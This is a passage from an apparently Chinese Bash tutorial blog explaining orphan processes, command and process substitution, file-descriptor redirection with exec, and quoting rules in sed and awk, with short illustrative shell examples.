将整个while放入后台，因为整个while放入了后台，所以while不能使用当前bash进程，因此创建了一个临时的新子bash进程，当把当前bash杀掉时，新子bash进程会成为孤儿进程独自挂载在pid=init/system（1）上，进程不停止，使用pstree -p | grep sleep 查看pid，再使用kill -9 pid杀掉。</span><span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token keyword">do</span> <span class="token function">sleep</span> 100 <span class="token operator">&amp;</span> <span class="token function">sleep</span> 1<span class="token punctuation">;</span><span class="token keyword">done</span><span class="token comment" spellcheck="true">## 每秒产生一个sleep后台进程，将当前bash杀掉后，创建的sleep进程都会直接挂载到pid=init/system（1）下，并没有产生任何新子bash进程，注意与上面的将整个while放入后台区分。</span><span class="token punctuation">(</span>sleep 30 <span class="token operator">&amp;</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 使用括号，也会创建一个子进程来运行当前命令，只是括号结束时，子进程会被瞬间杀掉，但sleep不会被杀掉，所以sleep成为孤儿进程。结果与第二个类似</span></code></pre><img src="https://gitee.com/lingying177/blogimage/raw/master/img/Bash-Shell/while-子进程.png" style="zoom: 67%;" /><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#           |-bash(3847)---sleep(3893)  #第一个将整个while放入后台后杀掉的结果</span><span class="token comment" spellcheck="true">#           |-sleep(3894)  ## 第二个分别放入后台并杀掉的结果</span><span class="token comment" spellcheck="true">#           |-sleep(3896)  ## 第二种的孤儿进程最后会被系统杀掉，</span><span class="token comment" spellcheck="true">#           |-sleep(3898)  ## 但是第一种创建了子bash的进程不会被系统杀掉</span><span class="token comment" spellcheck="true">#           |-sleep(3900)</span><span class="token comment" spellcheck="true">#           |-sleep(3902)</span><span class="token comment" spellcheck="true">#           |-sleep(3904)</span><span class="token comment" spellcheck="true">#           |-sleep(3906)</span><span class="token comment" spellcheck="true">#           |-sleep(3908)</span></code></pre><p><strong>原因解释：当后台命令运行在 子shell  中时，子shell退出，后台命令就成为了孤儿进程，而且会脱离终端，就像nohup功能。</strong></p><p><strong>特别的是，如果后台命令是for/while的话，那么将不断的循环，不会退出（即第一种while不会被系统杀掉）</strong></p><p><strong>注意第一个整个while放入后台的解释，与第二个分别放入后台的解释。</strong></p><p>解决方法：<code>killall bash / killall -9 bash</code></p><h4 id="6-命令替换、进程替换、后台进程"><a href="#6-命令替换、进程替换、后台进程" class="headerlink" title="6 命令替换、进程替换、后台进程"></a>6 命令替换、进程替换、后台进程</h4><h5 id="6-1-命令替换"><a href="#6-1-命令替换" class="headerlink" title="6.1 命令替换"></a>6.1 命令替换</h5><p>将一个命令运行，把产生的数据插入到命令行当中的某个地方。</p><ol><li><strong>$(cmd)</strong>  ：但命令替换中包含了特殊符号时，建议使用这个括号的形式</li><li>反引号 <strong>``</strong></li><li>命令替换，默认会将产生的换行符压缩成空格，可以使用双引号还原。</li><li>命令替换是先执行的</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token keyword">echo</span> haha<span class="token variable">`</span></span><span class="token punctuation">$(</span>echo <span class="token string">"haha"</span><span class="token punctuation">)</span><span class="token keyword">echo</span> `echo <span class="token string">"\a"</span><span class="token variable"><span class="token variable">`</span><span class="token keyword">echo</span> <span class="token variable">`</span></span><span class="token keyword">echo</span> <span class="token string">"\\a"</span><span class="token variable"><span class="token variable">`</span><span class="token keyword">echo</span> <span class="token variable">`</span></span><span class="token keyword">echo</span> <span class="token string">"\\\a"</span><span class="token variable"><span class="token variable">`</span><span class="token keyword">echo</span> <span class="token variable">`</span></span><span class="token keyword">echo</span> <span class="token string">"\\\\a"</span>`<span class="token keyword">echo</span> <span class="token punctuation">$(</span>echo <span class="token string">"\a"</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token punctuation">$(</span>echo <span class="token string">"\\a"</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token punctuation">$(</span>echo <span class="token string">"\\\a"</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token punctuation">$(</span>echo <span class="token string">"\\\\a"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">## 两种方式对于转义反斜线的替换不同，建议使用$()这一个。于平时对反斜线的理解一样。</span><span class="token keyword">echo</span> `echo -e <span class="token string">"a\nb"</span>`  <span class="token comment" spellcheck="true">## 换行符压缩成空格</span><span class="token keyword">echo</span> <span class="token string">"`echo -e "</span>a\nb<span class="token string">"`"</span>  <span class="token comment" spellcheck="true">## 再套一层双引号进行还原，就不会被压缩成空格了</span></code></pre><h5 id="6-2-后台进程-amp"><a href="#6-2-后台进程-amp" class="headerlink" title="6.2 后台进程  &amp;"></a>6.2 后台进程  &amp;</h5><p>多进程异步执行 &amp;</p><h5 id="6-3-进程替换"><a href="#6-3-进程替换" class="headerlink" title="6.3  进程替换"></a>6.3  进程替换</h5><ol><li>进程替换是<strong>通过虚拟文件</strong>来进行数据交互的，不是直接插入到某个地方。</li><li>进程替换也是先执行的，也是 <strong>多进程异步执行</strong>。</li><li>&gt;(cmd) 是输入进程替换，&lt;(cmd) 是输出进程替换</li></ol><p><code>&gt;(cmd) &lt;(cmd)</code>：使用<strong>输出重定向符号</strong>的其实是<strong>输入进程替换</strong>，使用<strong>输入重定向符号</strong>的其实是<strong>输出进程替换</strong>。<strong><em>重定向符号加上括号才是进程替换，不然就只是重定向</em></strong></p><p>（别人产生的数据输出给我们，从我们角度看就是输入数据，所以输出重定向符号是输入进程替换，看方向，指向我们，所以是输入给我们；</p><p>我们产生的数方向给别人，从我们角度看就是输出数据，所以输入重定向符号是输出进程替换，看方向，指向别人，所以是输出）注意：<strong>符号都放在命令左侧</strong>再加括号</p><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"abcde"</span> <span class="token operator">|</span> <span class="token function">tee</span> <span class="token operator">></span><span class="token punctuation">(</span>grep <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token operator">></span>/dev/null <span class="token operator">|</span> <span class="token function">cat</span> -<span class="token comment" spellcheck="true"># 这一句同时实现了 cmd1 | cmd2 &amp; | cmd3 协程的功能：grep等价于cmd2 &amp;</span><span class="token keyword">echo</span> <span class="token string">"abcde"</span> <span class="token operator">|</span> <span class="token function">tee</span> <span class="token operator">></span><span class="token punctuation">(</span>grep <span class="token string">"a"</span><span class="token punctuation">)</span> <span class="token operator">></span>/dev/null <span class="token comment" spellcheck="true">#去掉后面的内容可以证明是异步执行</span><span class="token keyword">echo</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span>cat /etc/fstab<span class="token punctuation">)</span><span class="token function">cat</span>  <span class="token operator">&lt;</span><span class="token punctuation">(</span>cat /etc/fstab<span class="token punctuation">)</span><span class="token function">cat</span>  /etc/fstab <span class="token operator">|</span> <span class="token function">tee</span> <span class="token operator">></span><span class="token punctuation">(</span>grep -i <span class="token string">"UUID"</span><span class="token punctuation">)</span> <span class="token operator">></span>/dev/null</code></pre><h5 id="6-4-协程（coproc）"><a href="#6-4-协程（coproc）" class="headerlink" title="6.4 协程（coproc）"></a>6.4 协程（coproc）</h5><p>协程（coproc）和协同子程序（coroutine），协同函数</p><p>作用：<code>cmd(-&gt;) | cmd &amp; | (-&gt;)cmd</code></p><p>取代协程：1.命名管道、2.tee + 进程替换</p><h4 id="7-命令组合"><a href="#7-命令组合" class="headerlink" title="7. 命令组合"></a>7. 命令组合</h4><ol><li><p>命令组合都是bash的内置结构，需要专门的bash提供运行环境</p></li><li><p>其他的组合：<code>for、if、while、until、case、select、[[]]、(())、{}</code></p></li><li><p><code>()</code>：在<strong>子shell</strong>中执行命令组合，括号被当前bash解析，结果就是创建子bash，但是如果命令组合中，只有一个命令，那么这个命令就会直接覆盖子shell进程。</p></li><li><p><code>{}</code>：在  <strong>当前shell</strong>  中执行命令组合</p><p>注意：</p><ol><li>大括号左右两边留有空格</li><li>所有命令以分号结尾，除非换行</li></ol></li></ol><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">(</span>echo <span class="token variable">$BASEPID</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">## BASHPID 的结果返回执行该语句的bash进程的pid</span><span class="token punctuation">(</span>sleep 2 <span class="token operator">|</span> <span class="token function">ps</span> -H<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">## ps -H 可以显示出进程的继承关系</span><span class="token punctuation">{</span>sleep 2 <span class="token operator">|</span> <span class="token function">ps</span> -H<span class="token punctuation">}</span>   <span class="token comment" spellcheck="true">## 对比来看，一目了然</span></code></pre><img src="https://gitee.com/lingying177/blogimage/raw/master/img/Bash-Shell/命令组合.png" style="zoom: 67%;" /><h4 id="8-shell-read读取文件和read替换管道"><a href="#8-shell-read读取文件和read替换管道" class="headerlink" title="8. shell  read读取文件和read替换管道"></a>8. shell  read读取文件和read替换管道</h4><h5 id="8-1-read-基本用法"><a href="#8-1-read-基本用法" class="headerlink" title="8.1 read 基本用法"></a>8.1 read 基本用法</h5><ol><li><p>read  -p  ：从终端中读取数据（交互式），读取的数据可以保存到多个变量中</p><ol><li><code>read -p &quot;输入你的名字：&quot; name</code>：提示你输入名字，保存在 $name变量中</li><li><code>read -p &quot;输入你的名字：&quot;</code>：不指定name变量，那么默认保存在 $REPLY变量中</li></ol></li><li><p>read  &lt;/etc/hosts   ：可以从<strong>标准输入</strong>中（管道、输入重定向）读取数据，默认读取一行。结果保存在$REPLY 中。如果后面写了多个变量，则会默认按空格分隔每个变量的赋值.</p><ol><li><code>read  -d  ‘a’  &lt;/etc/hosts</code>   ：指定a作为行分隔符，读取一行（a前面的）</li><li><code>read -a  arr  &lt;/etc/hosts</code>    ：读取数据，并将结果保存在名为arr的数组中</li></ol></li><li><p><strong>read 在读取完一次数据之后，会在读取到的位置打上标记（文件指针），表示这次已经读取到了这里，下次将继续从这里开始向下读取。</strong></p><ol><li>如果多次执行<code>read   &lt;/etc/hosts</code>  ，会发现与我们说的不同，这是因为每执行一次重定向，就相当于重新打开一次文件，文件指针就会被初始化到一开始的位置。</li><li>解决重定向导致的问题：（一次重定向，多次读取）<code>{read;echo $REPLY; read ; echo $REPLY;} &lt;/etc/hosts</code></li><li><a href="https://www.cnblogs.com/f-ck-need-u/p/7402149.html" target="_blank" rel="noopener">https://www.cnblogs.com/f-ck-need-u/p/7402149.html</a> </li></ol></li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">read</span>  var1 var2 var3 <span class="token operator">&lt;</span>/etc/hosts  <span class="token comment" spellcheck="true"># var1 ：127.0.0.1</span><span class="token comment" spellcheck="true"># var2 ：localhost</span><span class="token comment" spellcheck="true"># var3 ：localhost.localdomain localhost4 localhost4.localdomain4</span><span class="token function">read</span> -a  arr  <span class="token operator">&lt;</span>/etc/hosts <span class="token keyword">echo</span> <span class="token variable">${arr[@]}</span>  <span class="token comment" spellcheck="true"># 查看数组全部数据</span><span class="token keyword">echo</span> <span class="token variable">${arr[0]}</span>  <span class="token comment" spellcheck="true"># 查看第一个数据</span><span class="token keyword">echo</span> <span class="token variable">${arr[1]}</span><span class="token keyword">echo</span> <span class="token variable">${arr[2]}</span><span class="token keyword">echo</span> <span class="token variable">${arr[3]}</span></code></pre><h5 id="8-2-在shell中指定输入（数据）源的方式"><a href="#8-2-在shell中指定输入（数据）源的方式" class="headerlink" title="8.2 在shell中指定输入（数据）源的方式"></a>8.2 在shell中指定输入（数据）源的方式</h5><ol><li><p>直接给文件：命令后直接加文件</p></li><li><p>管道：管道很牛，但有缺点</p></li><li><p>输入重定向：通过输入重定向，就代表着使用了标准输入。</p><ul><li>常见：&lt;filename  、 &lt;(cmd)：第二个是进程替换 </li></ul></li><li><p>here string  ：三个<code>&lt;</code></p><ul><li><code>cat  &lt;&lt;&lt;  “hello”</code>：将hello做为cat的输入</li></ul></li><li><p>here  doc ：<code>&lt;&lt;eof</code>：eof就代表文件开始的头位置，再次输入eof代表文件结束</p></li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">cat</span> <span class="token operator">&lt;&lt;</span>eof<span class="token operator">></span>hello<span class="token operator">></span>world<span class="token operator">!</span><span class="token operator">></span>eof   <span class="token comment" spellcheck="true">## 文件结束</span></code></pre><h5 id="8-3-读取数据的方式"><a href="#8-3-读取数据的方式" class="headerlink" title="8.3 读取数据的方式"></a>8.3 读取数据的方式</h5><ol><li><p>程序自身读取文件或标准输入的逻辑，程序员控制的，我们shell用户没法控制</p></li><li><p>shell下的read ，用户可控</p><ol><li><p>while read line：不建议使用管道+while read line（管道会创建子进程来执行while语句）</p></li><li><p>按字符读取</p></li><li><p>按行读取</p><p>注意区分：<strong>read是读取数据的，管道是传递数据的</strong></p></li></ol></li></ol><h5 id="8-4-while-read-line-如何替换管道"><a href="#8-4-while-read-line-如何替换管道" class="headerlink" title="8.4 while read line 如何替换管道"></a>8.4 while read line 如何替换管道</h5><pre class=" language-bash"><code class="language-bash"><span class="token keyword">while</span> <span class="token function">read</span> line<span class="token punctuation">;</span><span class="token keyword">do</span>    <span class="token comment" spellcheck="true">#...</span>    <span class="token comment" spellcheck="true">#...  多次操作</span>    <span class="token comment" spellcheck="true">#...</span><span class="token keyword">done</span> <span class="token operator">&lt;</span>/etc/passwd</code></pre><h4 id="9-重定向"><a href="#9-重定向" class="headerlink" title="9. 重定向"></a>9. 重定向</h4><h5 id="9-1-基础（背景知识）"><a href="#9-1-基础（背景知识）" class="headerlink" title="9.1 基础（背景知识）"></a>9.1 基础（背景知识）</h5><p>重定向的作用：</p><ol><li>为程序指定数据输入源</li><li>为程序指定数据输出目标</li></ol><p>重定向基础内容：</p><ol><li><p>文件和文件描述符：</p><p><code>/proc/self/fd/</code>：文件描述符表的位置，对应于文件描述符，所以 <code>/proc/</code>目录是用户查看内核和改变内核的入口，注意文件描述符在用户空间层。</p></li><li><p>/dev/stdin(0)</p></li><li><p>/dev/stdout(1)</p></li><li><p>/dev/stderr(2)   ：注意：每个程序运行时都打开了上面三个文件描述符（0、1、2）</p></li><li><p>/proc/self/fd ：这是<strong>本进程</strong>打开的文件描述符</p></li><li><p>软连接指向关系：</p><ol><li>目录：<code>/dev/fd  -&gt;  /proc/self/fd</code></li><li><code>/dev/std(in,out,err) -&gt; /proc/self/fd/{0,1,2}</code></li><li><code>/proc/self/fd/{0,1,2}  -&gt; /dev/pts/N</code>（N是终端号，最终连接到了当前终端）</li></ol></li><li><p>特殊文件：短横线（<code>-</code>），代表了读取标准输入，需要程序内部代码去解析短横线特殊文件，如果没有相关解析代码，会报错。</p></li><li><p>重定向操作是在shell解析命令行的时候执行的，在命令执行之前，就已经确定了（即完成数据处理操作）</p></li><li><p>注意：重定向操作可以放在命令行的任意位置。</p></li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">ls</span> -l /dev/std*<span class="token comment" spellcheck="true"># /dev/stdin   ->   /proc/self/fd/0</span><span class="token comment" spellcheck="true"># /dev/stdout  ->   /proc/self/fd/1</span><span class="token comment" spellcheck="true"># /dev/stderr  ->   /proc/self/fd/2</span><span class="token function">ls</span> -l /proc/self/fd    <span class="token comment" spellcheck="true">##当我们输入了这些命令行，还没敲回车时，这个目录是不存在的。敲下回车之后，就记录了本进程（ls）所打开的文件描述符</span><span class="token comment" spellcheck="true"># 0 -> /dev/pts/0     ## 这个/dev/pts/0  就是当前的终端 ，意思就是数据的输入输出读取都</span><span class="token comment" spellcheck="true"># 1 -> /dev/pts/0     ## 传输到这个终端</span><span class="token comment" spellcheck="true"># 2 -> /dev/pts/0</span><span class="token comment" spellcheck="true"># 3 -> /proc/2666/fd</span><span class="token function">ls</span> -l /proc/self/fd   <span class="token comment" spellcheck="true">## 新开一个终端，再次使用次命令</span><span class="token comment" spellcheck="true"># 0 -> /dev/pts/1     ## 都连接/dev/pts/1 这个终端（当前终端）</span><span class="token comment" spellcheck="true"># 1 -> /dev/pts/1</span><span class="token comment" spellcheck="true"># 2 -> /dev/pts/1</span><span class="token comment" spellcheck="true"># 3 -> /proc/2736/fd</span></code></pre><h5 id="9-2-基本重定向"><a href="#9-2-基本重定向" class="headerlink" title="9.2 基本重定向"></a>9.2 基本重定向</h5><ol><li>输入重定向 <code>&lt;</code>：（使用输入重定向之后，数据就变成了标准输入）</li><li>覆盖（截断）输出重定向 <code>&gt;</code>：</li><li>追加输出重定向 <code>&gt;&gt;</code></li><li>标准错误<code>2&gt;</code></li><li>重定向可以放在命令行的任意位置，因为是执行之前就解析</li></ol><h5 id="9-3-exec的作用"><a href="#9-3-exec的作用" class="headerlink" title="9.3 exec的作用"></a>9.3 exec的作用</h5><ol><li>替换当前shell进程</li><li>让重定向操作在当前shell下生效</li><li>exec只能让输出重定向在当前shell下生效</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">exec</span> <span class="token operator">></span>/tmp/a.log<span class="token function">ls</span>                        <span class="token comment" spellcheck="true"># 结果不会在屏幕输出，而是进入/tmp/a.log</span><span class="token function">cat</span> /etc/passwd           <span class="token comment" spellcheck="true"># 同理不会再屏幕输出</span></code></pre><h5 id="9-4-高级重定向"><a href="#9-4-高级重定向" class="headerlink" title="9.4 高级重定向"></a>9.4 高级重定向</h5><h6 id="9-4-1-复制（duplicate）："><a href="#9-4-1-复制（duplicate）：" class="headerlink" title="9.4.1  复制（duplicate）："></a>9.4.1  复制（duplicate）：</h6><ol><li><p><code>[n]&gt;&amp;N</code> （省略n时，默认n=1）</p></li><li><p><code>[n]&lt;&amp;N</code> （省略n时，默认n=0）</p></li><li><p><strong>含义解析：让 n 指向 N 所指的 文件（不严谨）</strong>。指向的是文件或设备！！！</p></li><li><p>方便理解：</p><p><code>&gt;/dev/null 2&gt;&amp;1</code>：先把1定义到空，再把2定义到1所指的文件（空）。结果2和1都定义到了空，没有任何输出 ===（<code>&amp;&gt;/dev/null</code>）</p></li><li><p>重定向的顺序很重要：</p><p>第四步如果这样写：<code>2&gt;&amp;1 &gt;/dev/null</code>：会导致 2 先定义到1所指的输出（屏幕），再把1指向空。结果：错误输出定向到了屏幕，标准输出定向到了空文件</p></li><li><p>通过exec将文件描述符绑定到文件：</p></li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">exec</span> 5<span class="token operator">&lt;</span>/etc/hosts    <span class="token comment" spellcheck="true"># 把文件描述符5 绑定到文件/etc/hosts</span><span class="token function">read</span> <span class="token operator">&lt;</span><span class="token operator">&amp;</span>5      <span class="token comment" spellcheck="true"># 再把标准输入（0）绑定到文件描述符为5的文件上（/etc/hosts）</span></code></pre><p><strong>注意</strong>：之所以说上面的含义不严谨，是因为 fd table 中文件描述符都指向了open file table中的一条记录。他们两个描述符<strong>共享同一个文件偏移量指针</strong>，都互相影响（因为指针共享）。例：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">exec</span>  3<span class="token operator">></span>/tmp/a.log<span class="token keyword">echo</span> <span class="token string">"haha1"</span> <span class="token operator">></span><span class="token operator">&amp;</span>3<span class="token keyword">echo</span> <span class="token string">"haha2"</span> <span class="token operator">></span><span class="token operator">&amp;</span>3<span class="token keyword">echo</span> <span class="token string">"haha3"</span> <span class="token operator">></span><span class="token operator">&amp;</span>3<span class="token comment" spellcheck="true"># 结果：</span><span class="token comment" spellcheck="true"># haha1  </span><span class="token comment" spellcheck="true"># haha2</span><span class="token comment" spellcheck="true"># haha3 </span><span class="token comment" spellcheck="true"># 结果三行都存在，我们明明使用了一个'>',本来表示覆盖重定向，但是并没有覆盖，同理绑定4到3</span><span class="token function">exec</span>  4<span class="token operator">></span><span class="token operator">&amp;</span>3<span class="token keyword">echo</span> <span class="token string">"haha4"</span> <span class="token operator">></span><span class="token operator">&amp;</span>4<span class="token keyword">echo</span> <span class="token string">"haha5"</span> <span class="token operator">></span><span class="token operator">&amp;</span>4<span class="token keyword">echo</span> <span class="token string">"haha6"</span> <span class="token operator">></span><span class="token operator">&amp;</span>4<span class="token comment" spellcheck="true"># 结果也是 haha1 到 haha6 都有。</span><span class="token comment" spellcheck="true"># 原因解释：文件描述符共享文件偏移指针。虽然执行多次echo操作，但文件仅打开了一次。第一次输出haha1之后，文件偏移指针指向了haha1的后面，由于偏移指针共享，所以再次输出haha2时，会接着上一次的指针位置去写数据（上一次指针位置是haha1后面）。同理后面绑定4到3，均不会再次打开文件，而是接着上一次的指针位置去写数据。</span><span class="token comment" spellcheck="true"># 虽然只是用了一个“>”，但是并不表示覆盖重定向。他是 "n>&amp;N" ，文件描述符复制。</span></code></pre><h6 id="9-4-2-关闭（close）文件描述符"><a href="#9-4-2-关闭（close）文件描述符" class="headerlink" title="9.4.2  关闭（close）文件描述符"></a>9.4.2  关闭（close）文件描述符</h6><ol><li><code>[n]&gt;&amp;-</code></li><li><code>[n]&lt;&amp;-</code></li></ol><h6 id="9-4-3-打开（open）文件描述符"><a href="#9-4-3-打开（open）文件描述符" class="headerlink" title="9.4.3  打开（open）文件描述符"></a>9.4.3  打开（open）文件描述符</h6><ol><li><code>exec  6&lt;&gt;  /etc/fstab</code>：可读可写的方式绑定6到文件上（默认不用，因为指针从头开始，会覆盖数据）</li><li>文件描述符的复制，也会打开文件描述符</li></ol><h6 id="9-4-6-移动（move）文件描述符"><a href="#9-4-6-移动（move）文件描述符" class="headerlink" title="9.4.6  移动（move）文件描述符"></a>9.4.6  移动（move）文件描述符</h6><ol><li><code>[n]&gt;&amp;N-</code></li><li><code>[n]&lt;&amp;N-</code> </li><li><strong>含义解析：移动的意思就是先复制一份文件，然后把源文件删除。即 先复制一份文件描述符n，然后关闭原来的 N 文件描述符</strong></li></ol><h5 id="9-5-高级重定向用法示例"><a href="#9-5-高级重定向用法示例" class="headerlink" title="9.5 高级重定向用法示例"></a>9.5 高级重定向用法示例</h5><ol><li>文件描述符的备份和还原（w命令可以查看用户及终端）</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token function">exec</span> 6<span class="token operator">></span><span class="token operator">&amp;</span>1                            <span class="token comment" spellcheck="true"># 6 指向 1（把1备份为6）</span><span class="token function">exec</span> <span class="token operator">></span> /tmp/file.txt                 <span class="token comment" spellcheck="true"># 1定向到文件，完成操作</span><span class="token keyword">echo</span> <span class="token string">"---------------"</span><span class="token function">exec</span> 1<span class="token operator">></span><span class="token operator">&amp;</span>6 6<span class="token operator">></span><span class="token operator">&amp;</span>-                       <span class="token comment" spellcheck="true"># 操作完，再把 1 还原，删除6</span><span class="token keyword">echo</span> <span class="token string">"==============="</span>               <span class="token comment" spellcheck="true"># 完成工作</span><span class="token comment" spellcheck="true">##  （推荐使用第一种  备份和还原操作）</span><span class="token comment" spellcheck="true"># 第二种直接还原的方法：先在另一个终端种执行 w 命令，查看终端pts/[n]，然后执行下面的语句即可</span><span class="token function">exec</span> 1<span class="token operator">></span>/dev/pts/<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token comment" spellcheck="true">## Linux一切皆文件，文件描述符指向哪个文件（设备、终端），就会向哪个文件（终端、设备）输出</span><span class="token comment" spellcheck="true">## 如果在pts/1下执行这些命令，就会将数据输出到另一个终端：</span><span class="token function">exec</span> 1<span class="token operator">></span>/dev/pts/0<span class="token keyword">echo</span> <span class="token string">"我是终端1"</span><span class="token comment" spellcheck="true">## 此时，pts/0 终端就会输出  我是终端1</span><span class="token comment" spellcheck="true">## 注意：一切皆文件</span></code></pre><ol start="2"><li>实现临时文件（一切皆文件）</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># open fd=3 and remove file    # 创建文件，然后删除</span><span class="token function">exec</span> 3<span class="token operator">&lt;</span><span class="token operator">></span> /tmp/<span class="token variable">${0}</span><span class="token variable">${$}</span>.temp<span class="token function">rm</span> -rf /tmp/<span class="token variable">${0}</span><span class="token variable">${$}</span>.temp<span class="token comment" spellcheck="true"># file deleted          </span><span class="token function">ls</span> /proc/self/fd              <span class="token comment" spellcheck="true"># 通过查看，描述符还在，说明重定向的文件还能用</span><span class="token function">lsof</span> -n <span class="token operator">|</span> <span class="token function">grep</span> -E <span class="token string">'temp.*delete[d]'</span>          <span class="token comment" spellcheck="true"># 发现被删除了，但是文件描述符依然能用</span><span class="token comment" spellcheck="true">#write to fd</span><span class="token keyword">echo</span> <span class="token string">"hello world"</span> <span class="token operator">></span><span class="token operator">&amp;</span>3             <span class="token comment" spellcheck="true"># 向3中输入数据</span><span class="token comment" spellcheck="true"># read from fd</span><span class="token comment" spellcheck="true"># cat &lt;&amp;3                     # 此处不用 cat直接从3中读取，是因为只打开了一次文件，刚才写入数据之后，</span><span class="token function">cat</span> /proc/self/fd/3           <span class="token comment" spellcheck="true"># 偏移指针就指向了world的末尾，直接用cat读取会直接向后读，没有数据的，必须使用cat 读取那个文件（Linux一切皆文件！！！），才是重新打开描述符3</span><span class="token comment" spellcheck="true"># close fd              # 关闭</span><span class="token function">exec</span> 3<span class="token operator">&lt;</span><span class="token operator">&amp;</span>-<span class="token function">lsof</span> -n <span class="token operator">|</span> <span class="token function">grep</span> -E <span class="token string">'temp.*delete[d]'</span></code></pre><ol start="3"><li>多进程控制（进程池）<ul><li>后台进程</li><li>进程替换</li><li>coproc</li><li>xargs -P N  ：<ul><li>指定最多多少进程同时运行，只适用于没有大量IO操作的场景</li><li>split/csplit</li></ul></li><li>parallel ：解决xargs的缺点，但  复杂</li></ul></li></ol><h4 id="10-shell-解析命令行"><a href="#10-shell-解析命令行" class="headerlink" title="10. shell 解析命令行"></a>10. shell 解析命令行</h4><h5 id="10-1-引号解析示例"><a href="#10-1-引号解析示例" class="headerlink" title="10.1 引号解析示例"></a>10.1 引号解析示例</h5><ol><li>单引号中的双引号，以及双引号中的单引号，都会被保留不被 shell 解析（只解析配对的引号）</li><li>引号配对，从左至右进行配对</li><li>可以将一个参数通过引号配对的方式分隔开，分隔开，只要分隔的时候不要使用空白符号断开。（分隔开了就会被当成两个参数）</li><li>单引号是强引用，双引号是弱引用</li></ol><p>解析问题：</p><ol><li>如果在单引号中使用单引号，双引号中使用双引号，必须配对再输入一个单（双）引号</li><li>如果在不想让双引号中的特殊字符解析，必须转义。例如：<code>echo “\$name”</code></li><li>单引号（强引用）中使用反斜线转义没有意义。</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">'hello"world'</span><span class="token keyword">echo</span> <span class="token string">"hello'world"</span></code></pre><p><strong>sed 程序示例</strong>：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sed</span> -n <span class="token string">"<span class="token variable">$p</span>"</span> filename  <span class="token comment" spellcheck="true">## 如果想输出文件的最后一行，这是错误的。应该用单引号</span><span class="token function">sed</span> -n <span class="token string">'<span class="token variable">$p</span>'</span> filename  <span class="token comment" spellcheck="true">## 正确的使用</span><span class="token function">sed</span> -n \<span class="token variable">$p</span>  filename  <span class="token comment" spellcheck="true">## 正确</span><span class="token function">sed</span> -n <span class="token string">'$-2p'</span> /etc/passwd  <span class="token comment" spellcheck="true">## 想输出倒数第三行,使用错误,因为sed中的行号计数器只有在全部读取完文件后才给$赋值</span><span class="token function">wc</span> -l /etc/passwd<span class="token punctuation">;</span>line<span class="token operator">=</span>27<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">## 先把行号赋值给line变量</span><span class="token function">sed</span> -n <span class="token string">"<span class="token variable">${line}</span>p"</span> /etc/passwd  <span class="token comment" spellcheck="true">## 正确</span><span class="token function">sed</span> -n <span class="token string">"<span class="token variable">${line}</span>p;<span class="token variable">$p</span>"</span> /etc/passwd  <span class="token comment" spellcheck="true">## 想输出倒数第三行和最后一行,错误</span><span class="token function">sed</span> -n <span class="token string">"<span class="token variable">${line}</span>p;"</span><span class="token string">'<span class="token variable">$p</span>'</span> /etc/passwd  <span class="token comment" spellcheck="true">## 正确.使用单引号,不让shell 解析$p,而是交给sed处理</span><span class="token function">sed</span> -n <span class="token string">"<span class="token variable">${line}</span>p;\<span class="token variable">$p</span>"</span> /etc/passwd  <span class="token comment" spellcheck="true">## 正确.使用反斜线转义,也可实现</span><span class="token function">sed</span> -n <span class="token variable">${line}</span><span class="token string">"p;\<span class="token variable">$p</span>"</span> /etc/passwd  <span class="token comment" spellcheck="true">## 也可以</span></code></pre><p><strong>awk 程序示例</strong>：</p><pre class=" language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">## 想输出  hello'world  (带单引号)</span><span class="token function">awk</span> <span class="token string">'BEGIN{print "hello world"}'</span>  <span class="token comment" spellcheck="true">## 输出不带单引号的hello world 成功</span><span class="token function">awk</span> <span class="token string">'BEGIN{print "hello'</span>world<span class="token string">"}'  ## 输出带单引号的hello'world 失败 (看颜色也可以知道),因为前两个双引号配对了,shell就解析了,后面就剩了一个双引号,一个单引号awk 'BEGIN{print "</span>hello<span class="token string">' "'</span><span class="token string">" 'world"</span><span class="token punctuation">}</span><span class="token string">' ## 用双引号把那个单独的单引号包围,前后再加上单引号配对一开始的和最后的单引号,注意:引号引号之间没有空白符,我是为了理解才加上的awk " BEGIN{print \"hello'</span>world\<span class="token string">" }"</span>  <span class="token comment" spellcheck="true">## 正确,将一开始单引号换成双引号,里面的双引号进行转义(交给awk程序处理,单引号因没有配对,而被解析成单个字符)</span><span class="token function">awk</span> <span class="token string">'BEGIN{print "hello\047 world"}'</span> <span class="token comment" spellcheck="true">## 正确,用八进制ASCII代表单引号(shell不认识但awk认识ASCII)</span><span class="token function">awk</span> -v q<span class="token operator">=</span><span class="token string">"'"</span> <span class="token string">'BEGIN{print "hello"q"world"}'</span> <span class="token comment" spellcheck="true">## 把变量q定义为单引号,然后应用</span><span class="token comment" spellcheck="true">## 直接使用awk脚本文件a.awk,内容为:</span>BEGIN <span class="token punctuation">{</span>print <span class="token string">"hello'world"</span><span class="token punctuation">}</span>  <span class="token comment" spellcheck="true">## 不需要考虑与shell冲突的问题了</span></code></pre><h5 